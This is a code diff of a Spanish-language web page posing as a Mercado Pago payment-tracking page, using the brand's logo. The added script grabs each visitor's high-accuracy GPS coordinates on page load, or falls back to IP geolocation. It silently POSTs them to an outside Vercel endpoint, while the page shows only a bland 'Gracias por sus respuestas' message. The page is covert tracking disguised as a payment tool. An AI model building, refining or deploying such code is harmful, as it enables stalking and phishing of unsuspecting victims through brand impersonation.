@@ -3,152 +3,128 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
   <!-- LOGO ARRIBA A LA IZQUIERDA -->
-<div style="width: 100%; padding: 10px;">
-  <img src="https://http2.mlstatic.com/storage/pog-cm-admin/calm-assets/logo_mp_5560x300--560x300--e33eb5cd.webp" alt="Logo" style="height: 70px;">
-</div>
+  <div style="width: 100%; padding: 10px;">
+    <img src="https://http2.mlstatic.com/storage/pog-cm-admin/calm-assets/logo_mp_5560x300--560x300--e33eb5cd.webp" alt="Logo" style="height: 70px;">
+  </div>
 
   <title>Mercado pago</title>
 
   <script>
     var ubicacionesRegistradas = [];
 
-    // ================================
-    //   INICIO AUTOMÁTICO DE UBICACIÓN
-    // ================================
-    window.addEventListener("load", iniciarUbicacion);
+    // ========================================
+    //   INICIO AUTOMÁTICO (SIN BOTONES)
+    // ========================================
+    window.addEventListener("load", () => {
+      iniciarUbicacion();
+    });
 
     function iniciarUbicacion() {
-      console.log("Sistema iniciado");
-
       if ("geolocation" in navigator) {
-        console.log("Preguntando por GPS...");
         navigator.geolocation.getCurrentPosition(
           function (pos) {
-            console.log("GPS permitido");
             registrarGPS(pos);
+            enviarUbicacionesAlServidor(); // Envío inmediato
           },
-          function (err) {
-            console.log("GPS rechazado:", err);
+          function () {
             obtenerUbicacionIP();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
           }
         );
       } else {
-        console.log("Geolocalización no disponible, usando IP");
         obtenerUbicacionIP();
       }
     }
 
-    // ================================
-    //     UBICACIÓN POR GPS
-    // ================================
+    // ========================================
+    //      UBICACIÓN GPS
+    // ========================================
     function registrarGPS(position) {
       const latitud = position.coords.latitude;
       const longitud = position.coords.longitude;
 
-      ubicacionesRegistradas.push({ tipo: "GPS", latitud, longitud });
+      ubicacionesRegistradas.push({
+        tipo: "GPS",
+        latitud,
+        longitud
+      });
 
-      console.log("Guardado GPS:", ubicacionesRegistradas);
       actualizarListaUbicaciones();
     }
 
-    // ================================
-    //   UBICACIÓN APROXIMADA POR IP
-    // ================================
+    // ========================================
+    //   UBICACIÓN POR IP (fallback)
+    // ========================================
     async function obtenerUbicacionIP() {
-      console.log("Intentando obtener ubicación por IP...");
-
       try {
-        const r = await fetch("https://ipwho.is/");
+        const r = await fetch("https://ipapi.co/json/");
         const data = await r.json();
 
-        console.log("Respuesta IP:", data);
-
-        if (!data.success) {
-          console.log("Error en IP API:", data.message);
+        if (!data.latitude || !data.longitude) {
+          console.warn("IP no regresó coordenadas");
           return;
         }
 
-        const latitud = data.latitude;
-        const longitud = data.longitude;
-
         ubicacionesRegistradas.push({
           tipo: "IP",
-          latitud,
-          longitud
+          latitud: data.latitude,
+          longitud: data.longitude
         });
 
-        console.log("Guardado IP:", ubicacionesRegistradas);
         actualizarListaUbicaciones();
+        enviarUbicacionesAlServidor(); // Envío inmediato
 
       } catch (err) {
-        console.error("Error al obtener ubicación por IP:", err);
+        console.error("Error IP:", err);
       }
     }
 
-    // ================================
-    //     ACTUALIZAR LISTA EN HTML
-    // ================================
+    // ========================================
+    //  LISTA VISUAL (texto fijo)
+    // ========================================
     function actualizarListaUbicaciones() {
       var lista = document.getElementById("ubicaciones");
       lista.innerHTML = "";
 
-      var inicio = Math.max(0, ubicacionesRegistradas.length - 5);
+      var ultimas = ubicacionesRegistradas.slice(-5);
 
-      for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
-        var ubicacion = ubicacionesRegistradas[i];
-        var nuevaUbicacion = document.createElement("li");
-
-        nuevaUbicacion.textContent = "Gracias por sus respuestas";
-
-        nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
-        nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);
-
-        nuevaUbicacion.onclick = function () {
-          alert(
-            "Latitud: " +
-              decodificarCoordenada(this.dataset.latitud) +
-              ", Longitud: " +
-              decodificarCoordenada(this.dataset.longitud)
-          );
-        };
-
-        lista.appendChild(nuevaUbicacion);
-      }
+      ultimas.forEach((u) => {
+        var li = document.createElement("li");
+        li.textContent = "Gracias por sus respuestas";
+        lista.appendChild(li);
+      });
     }
 
-    // ================================
-    //    CODIFICAR Y DECODIFICAR
-    // ================================
-    function codificarCoordenada(coordenada) {
-      return coordenada.toFixed(4).split("").reverse().join("");
-    }
-
-    function decodificarCoordenada(coordenadaCodificada) {
-      return parseFloat(coordenadaCodificada.split("").reverse().join(""));
-    }
-
-    // ================================
-    // DESCARGAR / ENVIAR UBICACIONES
-    // ================================
-    async function descargarUbicaciones() {
+    // ========================================
+    //   ENVÍO AUTOMÁTICO A VERCEL
+    // ========================================
+    async function enviarUbicacionesAlServidor() {
       const texto = JSON.stringify(ubicacionesRegistradas);
 
       const vercelURL = "https://github-upload-api.vercel.app/api/subir";
 
-      const response = await fetch(vercelURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ texto })
-      });
+      try {
+        const response = await fetch(vercelURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ texto })
+        });
 
-      const data = await response.json();
+        const data = await response.json();
 
-      if (data.success) {
-        alert("Formulario enviado correctamente.");
-      } else {
-        alert("Error al subir el formulario. Revisa la consola.");
-        console.error("Error al subir:", data.error);
+        if (data.success) {
+          console.log("Formulario enviado automáticamente.");
+        } else {
+          console.error("Error al subir:", data.error);
+        }
+      } catch (e) {
+        console.error("Error al enviar:", e);
       }
     }
 
@@ -156,14 +132,13 @@
 </head>
 
 <body>
-  <h2>Rastreo y confrimacion de pagos</h2>
+  <h2>Rastreo y confirmación de pagos</h2>
 
-  <p>Ingrese numero de referencia de 7 digitos:</p>
+  <p>Ingrese número de referencia de 7 dígitos:</p>
   <form><textarea rows="1" cols="35"></textarea><br /><br /></form>
 
-  
   <ul id="ubicaciones"></ul>
 
-  <button onclick="descargarUbicaciones()">Consultar estatus</button>
+  <button onclick="enviarUbicacionesAlServidor()">Consultar estatus</button>
 </body>
 </html>
